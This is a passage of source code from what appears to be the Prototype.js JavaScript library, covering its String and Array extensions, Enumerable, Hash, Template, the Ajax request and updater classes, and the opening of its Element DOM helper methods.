    return this.replace(/<\/?[^>]+>/gi, '');
  },

  stripScripts: function() {
    return this.replace(new RegExp(Prototype.ScriptFragment, 'img'), '');
  },

  extractScripts: function() {
    var matchAll = new RegExp(Prototype.ScriptFragment, 'img');
    var matchOne = new RegExp(Prototype.ScriptFragment, 'im');
    return (this.match(matchAll) || []).map(function(scriptTag) {
      return (scriptTag.match(matchOne) || ['', ''])[1];
    });
  },

  evalScripts: function() {
    return this.extractScripts().map(function(script) { return eval(script) });
  },

  escapeHTML: function() {
    var self = arguments.callee;
    self.text.data = this;
    return self.div.innerHTML;
  },

  unescapeHTML: function() {
    var div = new Element('div');
    div.innerHTML = this.stripTags();
    return div.childNodes[0] ? (div.childNodes.length > 1 ?
      $A(div.childNodes).inject('', function(memo, node) { return memo+node.nodeValue }) :
      div.childNodes[0].nodeValue) : '';
  },

  toQueryParams: function(separator) {
    var match = this.strip().match(/([^?#]*)(#.*)?$/);
    if (!match) return { };

    return match[1].split(separator || '&').inject({ }, function(hash, pair) {
      if ((pair = pair.split('='))[0]) {
        var key = decodeURIComponent(pair.shift());
        var value = pair.length > 1 ? pair.join('=') : pair[0];
        if (value != undefined) value = decodeURIComponent(value);

        if (key in hash) {
          if (!Object.isArray(hash[key])) hash[key] = [hash[key]];
          hash[key].push(value);
        }
        else hash[key] = value;
      }
      return hash;
    });
  },

  toArray: function() {
    return this.split('');
  },

  succ: function() {
    return this.slice(0, this.length - 1) +
      String.fromCharCode(this.charCodeAt(this.length - 1) + 1);
  },

  times: function(count) {
    return count < 1 ? '' : new Array(count + 1).join(this);
  },

  camelize: function() {
    var parts = this.split('-'), len = parts.length;
    if (len == 1) return parts[0];

    var camelized = this.charAt(0) == '-'
      ? parts[0].charAt(0).toUpperCase() + parts[0].substring(1)
      : parts[0];

    for (var i = 1; i < len; i++)
      camelized += parts[i].charAt(0).toUpperCase() + parts[i].substring(1);

    return camelized;
  },

  capitalize: function() {
    return this.charAt(0).toUpperCase() + this.substring(1).toLowerCase();
  },

  underscore: function() {
    return this.gsub(/::/, '/').gsub(/([A-Z]+)([A-Z][a-z])/,'#{1}_#{2}').gsub(/([a-z\d])([A-Z])/,'#{1}_#{2}').gsub(/-/,'_').toLowerCase();
  },

  dasherize: function() {
    return this.gsub(/_/,'-');
  },

  inspect: function(useDoubleQuotes) {
    var escapedString = this.gsub(/[\x00-\x1f\\]/, function(match) {
      var character = String.specialChar[match[0]];
      return character ? character : '\\u00' + match[0].charCodeAt().toPaddedString(2, 16);
    });
    if (useDoubleQuotes) return '"' + escapedString.replace(/"/g, '\\"') + '"';
    return "'" + escapedString.replace(/'/g, '\\\'') + "'";
  },

  toJSON: function() {
    return this.inspect(true);
  },

  unfilterJSON: function(filter) {
    return this.sub(filter || Prototype.JSONFilter, '#{1}');
  },

  isJSON: function() {
    var str = this;
    if (str.blank()) return false;
    str = this.replace(/\\./g, '@').replace(/"[^"\\\n\r]*"/g, '');
    return (/^[,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]*$/).test(str);
  },

  evalJSON: function(sanitize) {
    var json = this.unfilterJSON();
    try {
      if (!sanitize || json.isJSON()) return eval('(' + json + ')');
    } catch (e) { }
    throw new SyntaxError('Badly formed JSON string: ' + this.inspect());
  },

  include: function(pattern) {
    return this.indexOf(pattern) > -1;
  },

  startsWith: function(pattern) {
    return this.indexOf(pattern) === 0;
  },

  endsWith: function(pattern) {
    var d = this.length - pattern.length;
    return d >= 0 && this.lastIndexOf(pattern) === d;
  },

  empty: function() {
    return this == '';
  },

  blank: function() {
    return /^\s*$/.test(this);
  },

  interpolate: function(object, pattern) {
    return new Template(this, pattern).evaluate(object);
  }
});

if (Prototype.Browser.WebKit || Prototype.Browser.IE) Object.extend(String.prototype, {
  escapeHTML: function() {
    return this.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  },
  unescapeHTML: function() {
    return this.stripTags().replace(/&amp;/g,'&').replace(/&lt;/g,'<').replace(/&gt;/g,'>');
  }
});

String.prototype.gsub.prepareReplacement = function(replacement) {
  if (Object.isFunction(replacement)) return replacement;
  var template = new Template(replacement);
  return function(match) { return template.evaluate(match) };
};

String.prototype.parseQuery = String.prototype.toQueryParams;

Object.extend(String.prototype.escapeHTML, {
  div:  document.createElement('div'),
  text: document.createTextNode('')
});

String.prototype.escapeHTML.div.appendChild(String.prototype.escapeHTML.text);

var Template = Class.create({
  initialize: function(template, pattern) {
    this.template = template.toString();
    this.pattern = pattern || Template.Pattern;
  },

  evaluate: function(object) {
    if (Object.isFunction(object.toTemplateReplacements))
      object = object.toTemplateReplacements();

    return this.template.gsub(this.pattern, function(match) {
      if (object == null) return '';

      var before = match[1] || '';
      if (before == '\\') return match[2];

      var ctx = object, expr = match[3];
      var pattern = /^([^.[]+|\[((?:.*?[^\\])?)\])(\.|\[|$)/;
      match = pattern.exec(expr);
      if (match == null) return before;

      while (match != null) {
        var comp = match[1].startsWith('[') ? match[2].gsub('\\\\]', ']') : match[1];
        ctx = ctx[comp];
        if (null == ctx || '' == match[3]) break;
        expr = expr.substring('[' == match[3] ? match[1].length : match[0].length);
        match = pattern.exec(expr);
      }

      return before + String.interpret(ctx);
    });
  }
});
Template.Pattern = /(^|.|\r|\n)(#\{(.*?)\})/;

var $break = { };

var Enumerable = {
  each: function(iterator, context) {
    var index = 0;
    try {
      this._each(function(value) {
        iterator.call(context, value, index++);
      });
    } catch (e) {
      if (e != $break) throw e;
    }
    return this;
  },

  eachSlice: function(number, iterator, context) {
    var index = -number, slices = [], array = this.toArray();
    if (number < 1) return array;
    while ((index += number) < array.length)
      slices.push(array.slice(index, index+number));
    return slices.collect(iterator, context);
  },

  all: function(iterator, context) {
    iterator = iterator || Prototype.K;
    var result = true;
    this.each(function(value, index) {
      result = result && !!iterator.call(context, value, index);
      if (!result) throw $break;
    });
    return result;
  },

  any: function(iterator, context) {
    iterator = iterator || Prototype.K;
    var result = false;
    this.each(function(value, index) {
      if (result = !!iterator.call(context, value, index))
        throw $break;
    });
    return result;
  },

  collect: function(iterator, context) {
    iterator = iterator || Prototype.K;
    var results = [];
    this.each(function(value, index) {
      results.push(iterator.call(context, value, index));
    });
    return results;
  },

  detect: function(iterator, context) {
    var result;
    this.each(function(value, index) {
      if (iterator.call(context, value, index)) {
        result = value;
        throw $break;
      }
    });
    return result;
  },

  findAll: function(iterator, context) {
    var results = [];
    this.each(function(value, index) {
      if (iterator.call(context, value, index))
        results.push(value);
    });
    return results;
  },

  grep: function(filter, iterator, context) {
    iterator = iterator || Prototype.K;
    var results = [];

    if (Object.isString(filter))
      filter = new RegExp(filter);

    this.each(function(value, index) {
      if (filter.match(value))
        results.push(iterator.call(context, value, index));
    });
    return results;
  },

  include: function(object) {
    if (Object.isFunction(this.indexOf))
      if (this.indexOf(object) != -1) return true;

    var found = false;
    this.each(function(value) {
      if (value == object) {
        found = true;
        throw $break;
      }
    });
    return found;
  },

  inGroupsOf: function(number, fillWith) {
    fillWith = Object.isUndefined(fillWith) ? null : fillWith;
    return this.eachSlice(number, function(slice) {
      while(slice.length < number) slice.push(fillWith);
      return slice;
    });
  },

  inject: function(memo, iterator, context) {
    this.each(function(value, index) {
      memo = iterator.call(context, memo, value, index);
    });
    return memo;
  },

  invoke: function(method) {
    var args = $A(arguments).slice(1);
    return this.map(function(value) {
      return value[method].apply(value, args);
    });
  },

  max: function(iterator, context) {
    iterator = iterator || Prototype.K;
    var result;
    this.each(function(value, index) {
      value = iterator.call(context, value, index);
      if (result == null || value >= result)
        result = value;
    });
    return result;
  },

  min: function(iterator, context) {
    iterator = iterator || Prototype.K;
    var result;
    this.each(function(value, index) {
      value = iterator.call(context, value, index);
      if (result == null || value < result)
        result = value;
    });
    return result;
  },

  partition: function(iterator, context) {
    iterator = iterator || Prototype.K;
    var trues = [], falses = [];
    this.each(function(value, index) {
      (iterator.call(context, value, index) ?
        trues : falses).push(value);
    });
    return [trues, falses];
  },

  pluck: function(property) {
    var results = [];
    this.each(function(value) {
      results.push(value[property]);
    });
    return results;
  },

  reject: function(iterator, context) {
    var results = [];
    this.each(function(value, index) {
      if (!iterator.call(context, value, index))
        results.push(value);
    });
    return results;
  },

  sortBy: function(iterator, context) {
    return this.map(function(value, index) {
      return {
        value: value,
        criteria: iterator.call(context, value, index)
      };
    }).sort(function(left, right) {
      var a = left.criteria, b = right.criteria;
      return a < b ? -1 : a > b ? 1 : 0;
    }).pluck('value');
  },

  toArray: function() {
    return this.map();
  },

  zip: function() {
    var iterator = Prototype.K, args = $A(arguments);
    if (Object.isFunction(args.last()))
      iterator = args.pop();

    var collections = [this].concat(args).map($A);
    return this.map(function(value, index) {
      return iterator(collections.pluck(index));
    });
  },

  size: function() {
    return this.toArray().length;
  },

  inspect: function() {
    return '#<Enumerable:' + this.toArray().inspect() + '>';
  }
};

Object.extend(Enumerable, {
  map:     Enumerable.collect,
  find:    Enumerable.detect,
  select:  Enumerable.findAll,
  filter:  Enumerable.findAll,
  member:  Enumerable.include,
  entries: Enumerable.toArray,
  every:   Enumerable.all,
  some:    Enumerable.any
});
function $A(iterable) {
  if (!iterable) return [];
  if (iterable.toArray) return iterable.toArray();
  var length = iterable.length || 0, results = new Array(length);
  while (length--) results[length] = iterable[length];
  return results;
}

if (Prototype.Browser.WebKit) {
  $A = function(iterable) {
    if (!iterable) return [];
    // In Safari, only use the `toArray` method if it's not a NodeList.
    // A NodeList is a function, has an function `item` property, and a numeric
    // `length` property. Adapted from Google Doctype.
    if (!(typeof iterable === 'function' && typeof iterable.length ===
        'number' && typeof iterable.item === 'function') && iterable.toArray)
      return iterable.toArray();
    var length = iterable.length || 0, results = new Array(length);
    while (length--) results[length] = iterable[length];
    return results;
  };
}

Array.from = $A;

Object.extend(Array.prototype, Enumerable);

if (!Array.prototype._reverse) Array.prototype._reverse = Array.prototype.reverse;

Object.extend(Array.prototype, {
  _each: function(iterator) {
    for (var i = 0, length = this.length; i < length; i++)
      iterator(this[i]);
  },

  clear: function() {
    this.length = 0;
    return this;
  },

  first: function() {
    return this[0];
  },

  last: function() {
    return this[this.length - 1];
  },

  compact: function() {
    return this.select(function(value) {
      return value != null;
    });
  },

  flatten: function() {
    return this.inject([], function(array, value) {
      return array.concat(Object.isArray(value) ?
        value.flatten() : [value]);
    });
  },

  without: function() {
    var values = $A(arguments);
    return this.select(function(value) {
      return !values.include(value);
    });
  },

  reverse: function(inline) {
    return (inline !== false ? this : this.toArray())._reverse();
  },

  reduce: function() {
    return this.length > 1 ? this : this[0];
  },

  uniq: function(sorted) {
    return this.inject([], function(array, value, index) {
      if (0 == index || (sorted ? array.last() != value : !array.include(value)))
        array.push(value);
      return array;
    });
  },

  intersect: function(array) {
    return this.uniq().findAll(function(item) {
      return array.detect(function(value) { return item === value });
    });
  },

  clone: function() {
    return [].concat(this);
  },

  size: function() {
    return this.length;
  },

  inspect: function() {
    return '[' + this.map(Object.inspect).join(', ') + ']';
  },

  toJSON: function() {
    var results = [];
    this.each(function(object) {
      var value = Object.toJSON(object);
      if (!Object.isUndefined(value)) results.push(value);
    });
    return '[' + results.join(', ') + ']';
  }
});

// use native browser JS 1.6 implementation if available
if (Object.isFunction(Array.prototype.forEach))
  Array.prototype._each = Array.prototype.forEach;

if (!Array.prototype.indexOf) Array.prototype.indexOf = function(item, i) {
  i || (i = 0);
  var length = this.length;
  if (i < 0) i = length + i;
  for (; i < length; i++)
    if (this[i] === item) return i;
  return -1;
};

if (!Array.prototype.lastIndexOf) Array.prototype.lastIndexOf = function(item, i) {
  i = isNaN(i) ? this.length : (i < 0 ? this.length + i : i) + 1;
  var n = this.slice(0, i).reverse().indexOf(item);
  return (n < 0) ? n : i - n - 1;
};

Array.prototype.toArray = Array.prototype.clone;

function $w(string) {
  if (!Object.isString(string)) return [];
  string = string.strip();
  return string ? string.split(/\s+/) : [];
}

if (Prototype.Browser.Opera){
  Array.prototype.concat = function() {
    var array = [];
    for (var i = 0, length = this.length; i < length; i++) array.push(this[i]);
    for (var i = 0, length = arguments.length; i < length; i++) {
      if (Object.isArray(arguments[i])) {
        for (var j = 0, arrayLength = arguments[i].length; j < arrayLength; j++)
          array.push(arguments[i][j]);
      } else {
        array.push(arguments[i]);
      }
    }
    return array;
  };
}
Object.extend(Number.prototype, {
  toColorPart: function() {
    return this.toPaddedString(2, 16);
  },

  succ: function() {
    return this + 1;
  },

  times: function(iterator, context) {
    $R(0, this, true).each(iterator, context);
    return this;
  },

  toPaddedString: function(length, radix) {
    var string = this.toString(radix || 10);
    return '0'.times(length - string.length) + string;
  },

  toJSON: function() {
    return isFinite(this) ? this.toString() : 'null';
  }
});

$w('abs round ceil floor').each(function(method){
  Number.prototype[method] = Math[method].methodize();
});
function $H(object) {
  return new Hash(object);
};

var Hash = Class.create(Enumerable, (function() {

  function toQueryPair(key, value) {
    if (Object.isUndefined(value)) return key;
    return key + '=' + encodeURIComponent(String.interpret(value));
  }

  return {
    initialize: function(object) {
      this._object = Object.isHash(object) ? object.toObject() : Object.clone(object);
    },

    _each: function(iterator) {
      for (var key in this._object) {
        var value = this._object[key], pair = [key, value];
        pair.key = key;
        pair.value = value;
        iterator(pair);
      }
    },

    set: function(key, value) {
      return this._object[key] = value;
    },

    get: function(key) {
      // simulating poorly supported hasOwnProperty
      if (this._object[key] !== Object.prototype[key])
        return this._object[key];
    },

    unset: function(key) {
      var value = this._object[key];
      delete this._object[key];
      return value;
    },

    toObject: function() {
      return Object.clone(this._object);
    },

    keys: function() {
      return this.pluck('key');
    },

    values: function() {
      return this.pluck('value');
    },

    index: function(value) {
      var match = this.detect(function(pair) {
        return pair.value === value;
      });
      return match && match.key;
    },

    merge: function(object) {
      return this.clone().update(object);
    },

    update: function(object) {
      return new Hash(object).inject(this, function(result, pair) {
        result.set(pair.key, pair.value);
        return result;
      });
    },

    toQueryString: function() {
      return this.inject([], function(results, pair) {
        var key = encodeURIComponent(pair.key), values = pair.value;

        if (values && typeof values == 'object') {
          if (Object.isArray(values))
            return results.concat(values.map(toQueryPair.curry(key)));
        } else results.push(toQueryPair(key, values));
        return results;
      }).join('&');
    },

    inspect: function() {
      return '#<Hash:{' + this.map(function(pair) {
        return pair.map(Object.inspect).join(': ');
      }).join(', ') + '}>';
    },

    toJSON: function() {
      return Object.toJSON(this.toObject());
    },

    clone: function() {
      return new Hash(this);
    }
  }
})());

Hash.prototype.toTemplateReplacements = Hash.prototype.toObject;
Hash.from = $H;
var ObjectRange = Class.create(Enumerable, {
  initialize: function(start, end, exclusive) {
    this.start = start;
    this.end = end;
    this.exclusive = exclusive;
  },

  _each: function(iterator) {
    var value = this.start;
    while (this.include(value)) {
      iterator(value);
      value = value.succ();
    }
  },

  include: function(value) {
    if (value < this.start)
      return false;
    if (this.exclusive)
      return value < this.end;
    return value <= this.end;
  }
});

var $R = function(start, end, exclusive) {
  return new ObjectRange(start, end, exclusive);
};

var Ajax = {
  getTransport: function() {
    return Try.these(
      function() {return new XMLHttpRequest()},
      function() {return new ActiveXObject('Msxml2.XMLHTTP')},
      function() {return new ActiveXObject('Microsoft.XMLHTTP')}
    ) || false;
  },

  activeRequestCount: 0
};

Ajax.Responders = {
  responders: [],

  _each: function(iterator) {
    this.responders._each(iterator);
  },

  register: function(responder) {
    if (!this.include(responder))
      this.responders.push(responder);
  },

  unregister: function(responder) {
    this.responders = this.responders.without(responder);
  },

  dispatch: function(callback, request, transport, json) {
    this.each(function(responder) {
      if (Object.isFunction(responder[callback])) {
        try {
          responder[callback].apply(responder, [request, transport, json]);
        } catch (e) { }
      }
    });
  }
};

Object.extend(Ajax.Responders, Enumerable);

Ajax.Responders.register({
  onCreate:   function() { Ajax.activeRequestCount++ },
  onComplete: function() { Ajax.activeRequestCount-- }
});

Ajax.Base = Class.create({
  initialize: function(options) {
    this.options = {
      method:       'post',
      asynchronous: true,
      contentType:  'application/x-www-form-urlencoded',
      encoding:     'UTF-8',
      parameters:   '',
      evalJSON:     true,
      evalJS:       true
    };
    Object.extend(this.options, options || { });

    this.options.method = this.options.method.toLowerCase();

    if (Object.isString(this.options.parameters))
      this.options.parameters = this.options.parameters.toQueryParams();
    else if (Object.isHash(this.options.parameters))
      this.options.parameters = this.options.parameters.toObject();
  }
});

Ajax.Request = Class.create(Ajax.Base, {
  _complete: false,

  initialize: function($super, url, options) {
    $super(options);
    this.transport = Ajax.getTransport();
    this.request(url);
  },

  request: function(url) {
    this.url = url;
    this.method = this.options.method;
    var params = Object.clone(this.options.parameters);

    if (!['get', 'post'].include(this.method)) {
      // simulate other verbs over post
      params['_method'] = this.method;
      this.method = 'post';
    }

    this.parameters = params;

    if (params = Object.toQueryString(params)) {
      // when GET, append parameters to URL
      if (this.method == 'get')
        this.url += (this.url.include('?') ? '&' : '?') + params;
      else if (/Konqueror|Safari|KHTML/.test(navigator.userAgent))
        params += '&_=';
    }

    try {
      var response = new Ajax.Response(this);
      if (this.options.onCreate) this.options.onCreate(response);
      Ajax.Responders.dispatch('onCreate', this, response);

      this.transport.open(this.method.toUpperCase(), this.url,
        this.options.asynchronous);

      if (this.options.asynchronous) this.respondToReadyState.bind(this).defer(1);

      this.transport.onreadystatechange = this.onStateChange.bind(this);
      this.setRequestHeaders();

      this.body = this.method == 'post' ? (this.options.postBody || params) : null;
      this.transport.send(this.body);

      /* Force Firefox to handle ready state 4 for synchronous requests */
      if (!this.options.asynchronous && this.transport.overrideMimeType)
        this.onStateChange();

    }
    catch (e) {
      this.dispatchException(e);
    }
  },

  onStateChange: function() {
    var readyState = this.transport.readyState;
    if (readyState > 1 && !((readyState == 4) && this._complete))
      this.respondToReadyState(this.transport.readyState);
  },

  setRequestHeaders: function() {
    var headers = {
      'X-Requested-With': 'XMLHttpRequest',
      'X-Prototype-Version': Prototype.Version,
      'Accept': 'text/javascript, text/html, application/xml, text/xml, */*'
    };

    if (this.method == 'post') {
      headers['Content-type'] = this.options.contentType +
        (this.options.encoding ? '; charset=' + this.options.encoding : '');

      /* Force "Connection: close" for older Mozilla browsers to work
       * around a bug where XMLHttpRequest sends an incorrect
       * Content-length header. See Mozilla Bugzilla #246651.
       */
      if (this.transport.overrideMimeType &&
          (navigator.userAgent.match(/Gecko\/(\d{4})/) || [0,2005])[1] < 2005)
            headers['Connection'] = 'close';
    }

    // user-defined headers
    if (typeof this.options.requestHeaders == 'object') {
      var extras = this.options.requestHeaders;

      if (Object.isFunction(extras.push))
        for (var i = 0, length = extras.length; i < length; i += 2)
          headers[extras[i]] = extras[i+1];
      else
        $H(extras).each(function(pair) { headers[pair.key] = pair.value });
    }

    for (var name in headers)
      this.transport.setRequestHeader(name, headers[name]);
  },

  success: function() {
    var status = this.getStatus();
    return !status || (status >= 200 && status < 300);
  },

  getStatus: function() {
    try {
      return this.transport.status || 0;
    } catch (e) { return 0 }
  },

  respondToReadyState: function(readyState) {
    var state = Ajax.Request.Events[readyState], response = new Ajax.Response(this);

    if (state == 'Complete') {
      try {
        this._complete = true;
        (this.options['on' + response.status]
         || this.options['on' + (this.success() ? 'Success' : 'Failure')]
         || Prototype.emptyFunction)(response, response.headerJSON);
      } catch (e) {
        this.dispatchException(e);
      }

      var contentType = response.getHeader('Content-type');
      if (this.options.evalJS == 'force'
          || (this.options.evalJS && this.isSameOrigin() && contentType
          && contentType.match(/^\s*(text|application)\/(x-)?(java|ecma)script(;.*)?\s*$/i)))
        this.evalResponse();
    }

    try {
      (this.options['on' + state] || Prototype.emptyFunction)(response, response.headerJSON);
      Ajax.Responders.dispatch('on' + state, this, response, response.headerJSON);
    } catch (e) {
      this.dispatchException(e);
    }

    if (state == 'Complete') {
      // avoid memory leak in MSIE: clean up
      this.transport.onreadystatechange = Prototype.emptyFunction;
    }
  },

  isSameOrigin: function() {
    var m = this.url.match(/^\s*https?:\/\/[^\/]*/);
    return !m || (m[0] == '#{protocol}//#{domain}#{port}'.interpolate({
      protocol: location.protocol,
      domain: document.domain,
      port: location.port ? ':' + location.port : ''
    }));
  },

  getHeader: function(name) {
    try {
      return this.transport.getResponseHeader(name) || null;
    } catch (e) { return null }
  },

  evalResponse: function() {
    try {
      return eval((this.transport.responseText || '').unfilterJSON());
    } catch (e) {
      this.dispatchException(e);
    }
  },

  dispatchException: function(exception) {
    (this.options.onException || Prototype.emptyFunction)(this, exception);
    Ajax.Responders.dispatch('onException', this, exception);
  }
});

Ajax.Request.Events =
  ['Uninitialized', 'Loading', 'Loaded', 'Interactive', 'Complete'];

Ajax.Response = Class.create({
  initialize: function(request){
    this.request = request;
    var transport  = this.transport  = request.transport,
        readyState = this.readyState = transport.readyState;

    if((readyState > 2 && !Prototype.Browser.IE) || readyState == 4) {
      this.status       = this.getStatus();
      this.statusText   = this.getStatusText();
      this.responseText = String.interpret(transport.responseText);
      this.headerJSON   = this._getHeaderJSON();
    }

    if(readyState == 4) {
      var xml = transport.responseXML;
      this.responseXML  = Object.isUndefined(xml) ? null : xml;
      this.responseJSON = this._getResponseJSON();
    }
  },

  status:      0,
  statusText: '',

  getStatus: Ajax.Request.prototype.getStatus,

  getStatusText: function() {
    try {
      return this.transport.statusText || '';
    } catch (e) { return '' }
  },

  getHeader: Ajax.Request.prototype.getHeader,

  getAllHeaders: function() {
    try {
      return this.getAllResponseHeaders();
    } catch (e) { return null }
  },

  getResponseHeader: function(name) {
    return this.transport.getResponseHeader(name);
  },

  getAllResponseHeaders: function() {
    return this.transport.getAllResponseHeaders();
  },

  _getHeaderJSON: function() {
    var json = this.getHeader('X-JSON');
    if (!json) return null;
    json = decodeURIComponent(escape(json));
    try {
      return json.evalJSON(this.request.options.sanitizeJSON ||
        !this.request.isSameOrigin());
    } catch (e) {
      this.request.dispatchException(e);
    }
  },

  _getResponseJSON: function() {
    var options = this.request.options;
    if (!options.evalJSON || (options.evalJSON != 'force' &&
      !(this.getHeader('Content-type') || '').include('application/json')) ||
        this.responseText.blank())
          return null;
    try {
      return this.responseText.evalJSON(options.sanitizeJSON ||
        !this.request.isSameOrigin());
    } catch (e) {
      this.request.dispatchException(e);
    }
  }
});

Ajax.Updater = Class.create(Ajax.Request, {
  initialize: function($super, container, url, options) {
    this.container = {
      success: (container.success || container),
      failure: (container.failure || (container.success ? null : container))
    };

    options = Object.clone(options);
    var onComplete = options.onComplete;
    options.onComplete = (function(response, json) {
      this.updateContent(response.responseText);
      if (Object.isFunction(onComplete)) onComplete(response, json);
    }).bind(this);

    $super(url, options);
  },

  updateContent: function(responseText) {
    var receiver = this.container[this.success() ? 'success' : 'failure'],
        options = this.options;

    if (!options.evalScripts) responseText = responseText.stripScripts();

    if (receiver = $(receiver)) {
      if (options.insertion) {
        if (Object.isString(options.insertion)) {
          var insertion = { }; insertion[options.insertion] = responseText;
          receiver.insert(insertion);
        }
        else options.insertion(receiver, responseText);
      }
      else receiver.update(responseText);
    }
  }
});

Ajax.PeriodicalUpdater = Class.create(Ajax.Base, {
  initialize: function($super, container, url, options) {
    $super(options);
    this.onComplete = this.options.onComplete;

    this.frequency = (this.options.frequency || 2);
    this.decay = (this.options.decay || 1);

    this.updater = { };
    this.container = container;
    this.url = url;

    this.start();
  },

  start: function() {
    this.options.onComplete = this.updateComplete.bind(this);
    this.onTimerEvent();
  },

  stop: function() {
    this.updater.options.onComplete = undefined;
    clearTimeout(this.timer);
    (this.onComplete || Prototype.emptyFunction).apply(this, arguments);
  },

  updateComplete: function(response) {
    if (this.options.decay) {
      this.decay = (response.responseText == this.lastText ?
        this.decay * this.options.decay : 1);

      this.lastText = response.responseText;
    }
    this.timer = this.onTimerEvent.bind(this).delay(this.decay * this.frequency);
  },

  onTimerEvent: function() {
    this.updater = new Ajax.Updater(this.container, this.url, this.options);
  }
});
function $(element) {
  if (arguments.length > 1) {
    for (var i = 0, elements = [], length = arguments.length; i < length; i++)
      elements.push($(arguments[i]));
    return elements;
  }
  if (Object.isString(element))
    element = document.getElementById(element);
  return Element.extend(element);
}

if (Prototype.BrowserFeatures.XPath) {
  document._getElementsByXPath = function(expression, parentElement) {
    var results = [];
    var query = document.evaluate(expression, $(parentElement) || document,
      null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
    for (var i = 0, length = query.snapshotLength; i < length; i++)
      results.push(Element.extend(query.snapshotItem(i)));
    return results;
  };
}

/*--------------------------------------------------------------------------*/

if (!window.Node) var Node = { };

if (!Node.ELEMENT_NODE) {
  // DOM level 2 ECMAScript Language Binding
  Object.extend(Node, {
    ELEMENT_NODE: 1,
    ATTRIBUTE_NODE: 2,
    TEXT_NODE: 3,
    CDATA_SECTION_NODE: 4,
    ENTITY_REFERENCE_NODE: 5,
    ENTITY_NODE: 6,
    PROCESSING_INSTRUCTION_NODE: 7,
    COMMENT_NODE: 8,
    DOCUMENT_NODE: 9,
    DOCUMENT_TYPE_NODE: 10,
    DOCUMENT_FRAGMENT_NODE: 11,
    NOTATION_NODE: 12
  });
}

(function() {
  var element = this.Element;
  this.Element = function(tagName, attributes) {
    attributes = attributes || { };
    tagName = tagName.toLowerCase();
    var cache = Element.cache;
    if (Prototype.Browser.IE && attributes.name) {
      tagName = '<' + tagName + ' name="' + attributes.name + '">';
      delete attributes.name;
      return Element.writeAttribute(document.createElement(tagName), attributes);
    }
    if (!cache[tagName]) cache[tagName] = Element.extend(document.createElement(tagName));
    return Element.writeAttribute(cache[tagName].cloneNode(false), attributes);
  };
  Object.extend(this.Element, element || { });
  if (element) this.Element.prototype = element.prototype;
}).call(window);

Element.cache = { };

Element.Methods = {
  visible: function(element) {
    return $(element).style.display != 'none';
  },

  toggle: function(element) {
    element = $(element);
    Element[Element.visible(element) ? 'hide' : 'show'](element);
    return element;
  },

  hide: function(element) {
    element = $(element);
    element.style.display = 'none';
    return element;
  },

  show: function(element) {
    element = $(element);
    element.style.display = '';
    return element;
  },

  remove: function(element) {
    element = $(element);
    element.parentNode.removeChild(element);
    return element;
  },

  update: function(element, content) {
    element = $(element);
    if (content && content.toElement) content = content.toElement();
    if (Object.isElement(content)) return element.update().insert(content);
    content = Object.toHTML(content);
    element.innerHTML = content.stripScripts();
    content.evalScripts.bind(content).defer();
    return element;
  },

  replace: function(element, content) {
    element = $(element);
    if (content && content.toElement) content = content.toElement();
    else if (!Object.isElement(content)) {
      content = Object.toHTML(content);
      var range = element.ownerDocument.createRange();
      range.selectNode(element);
      content.evalScripts.bind(content).defer();
      content = range.createContextualFragment(content.stripScripts());
    }
    element.parentNode.replaceChild(content, element);
    return element;
  },

  insert: function(element, insertions) {
    element = $(element);

    if (Object.isString(insertions) || Object.isNumber(insertions) ||
        Object.isElement(insertions) || (insertions && (insertions.toElement || insertions.toHTML)))
          insertions = {bottom:insertions};

    var content, insert, tagName, childNodes;

    for (var position in insertions) {
      content  = insertions[position];
      position = position.toLowerCase();
      insert = Element._insertionTranslations[position];

      if (content && content.toElement) content = content.toElement();
      if (Object.isElement(content)) {
        insert(element, content);
        continue;
      }

      content = Object.toHTML(content);

      tagName = ((position == 'before' || position == 'after')
        ? element.parentNode : element).tagName.toUpperCase();

      childNodes = Element._getContentFromAnonymousElement(tagName, content.stripScripts());

      if (position == 'top' || position == 'after') childNodes.reverse();
      childNodes.each(insert.curry(element));

      content.evalScripts.bind(content).defer();
    }

    return element;
  },

  wrap: function(element, wrapper, attributes) {
    element = $(element);
    if (Object.isElement(wrapper))
      $(wrapper).writeAttribute(attributes || { });
    else if (Object.isString(wrapper)) wrapper = new Element(wrapper, attributes);
    else wrapper = new Element('div', wrapper);
    if (element.parentNode)
      element.parentNode.replaceChild(wrapper, element);
    wrapper.appendChild(element);
    return wrapper;
  },

  inspect: function(element) {
    element = $(element);
    var result = '<' + element.tagName.toLowerCase();
    $H({'id': 'id', 'className': 'class'}).each(function(pair) {
      var property = pair.first(), attribute = pair.last();
      var value = (element[property] || '').toString();
      if (value) result += ' ' + attribute + '=' + value.inspect(true);
    });
    return result + '>';
  },

  recursivelyCollect: function(element, property) {
    element = $(element);
    var elements = [];
    while (element = element[property])
      if (element.nodeType == 1)
        elements.push(Element.extend(element));
    return elements;
  },

  ancestors: function(element) {
    return $(element).recursivelyCollect('parentNode');
  },

  descendants: function(element) {
    return $(element).select("*");
  },

  firstDescendant: function(element) {
    element = $(element).firstChild;
    while (element && element.nodeType != 1) element = element.nextSibling;
    return $(element);
  },

  immediateDescendants: function(element) {
    if (!(element = $(element).firstChild)) return [];
    while (element && element.nodeType != 1) element = element.nextSibling;
    if (element) return [element].concat($(element).nextSiblings());
    return [];
  },

  previousSiblings: function(element) {
    return $(element).recursivelyCollect('previousSibling');
  },

  nextSiblings: function(element) {
    return $(element).recursivelyCollect('nextSibling');
  },

  siblings: function(element) {
    element = $(element);
    return element.previousSiblings().reverse().concat(element.nextSiblings());
  },

  match: function(element, selector) {
    if (Object.isString(selector))
      selector = new Selector(selector);
    return selector.match($(element));
  },

  up: function(element, expression, index) {
    element = $(element);
    if (arguments.length == 1) return $(element.parentNode);
    var ancestors = element.ancestors();
    return Object.isNumber(expression) ? ancestors[expression] :
      Selector.findElement(ancestors, expression, index);
  },

  down: function(element, expression, index) {
    element = $(element);
    if (arguments.length == 1) return element.firstDescendant();
    return Object.isNumber(expression) ? element.descendants()[expression] :
      Element.select(element, expression)[index || 0];
  },

  previous: function(element, expression, index) {
    element = $(element);
    if (arguments.length == 1) return $(Selector.handlers.previousElementSibling(element));
    var previousSiblings = element.previousSiblings();
    return Object.isNumber(expression) ? previousSiblings[expression] :
      Selector.findElement(previousSiblings, expression, index);
  },

  next: function(element, expression, index) {
    element = $(element);
    if (arguments.length == 1) return $(Selector.handlers.nextElementSibling(element));
    var nextSiblings = element.nextSiblings();
    return Object.isNumber(expression) ? nextSiblings[expression] :
      Selector.findElement(nextSiblings, expression, index);
  },

  select: function() {
